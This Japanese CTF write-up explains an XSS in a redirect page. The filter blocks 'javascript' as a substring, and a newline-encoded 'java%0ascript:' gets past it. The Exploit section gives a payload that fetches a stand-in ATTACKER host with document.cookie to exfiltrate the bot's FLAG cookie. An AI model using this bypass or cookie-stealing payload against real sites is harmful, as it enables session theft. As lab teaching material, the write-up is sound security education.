---
title: Writeup for "You are being redirected"
date: 2026-02-19
tags: [writeup, xss, url]
summary: "You are being redirectedのWriteupです。"
---

# You are being redirected

## 概要

https://alpacahack.com/challenges/you-are-being-redirected

リダイレクトページ (`/redirect?to=...`) にXSSの脆弱性がある。Botは `FLAG` cookieを持った状態で報告されたURLを訪問するので、XSSでcookieを外部に送信してフラグを取得する。

## 分析

`redirect.html` では `to` パラメータの値に対して以下のフィルターが適用される

```js
const FORBIDDEN = ["data", "javascript", "blob"];

let dest = params.get("to") ?? "/";

if (FORBIDDEN.some((str) => dest.toLowerCase().includes(str))) {
  dest = "/";
}

const url = new URL(dest, window.location.href);
window.location.replace(url.href);
```

`javascript` が含まれていると `dest` が `/` にリセットされるため、一見 `javascript:` スキームは使えない。

## バイパス

[URL Living Standard](https://url.spec.whatwg.org/) の仕様上、`new URL()` はパース前に `\n` (`%0a`)、`\r` (`%0d`)、`\t` (`%09`) を削除する。

つまり

- `java%0ascript:alert()` → `params.get('to')` は `"java\nscript:alert()"` を返す
- `.includes("javascript")` → `"java\nscript"` には連続した `"javascript"` が含まれないので **フィルター通過**
- `new URL("java\nscript:alert()", base)` → 改行が除去され `javascript:alert()` として解釈 → **XSS成立**

## Exploit

Botに以下のpathを報告する

```
redirect?to=java%0ascript:fetch(`https://ATTACKER?${document.cookie}`)
```

Bot が `http://web:3000/redirect?to=java%0ascript:...` を訪問すると、2秒後に `javascript:` が実行され、`FLAG` cookieが攻撃者のサーバーに送信される。

攻撃者のサーバーで受信したリクエストからフラグを読み取る。
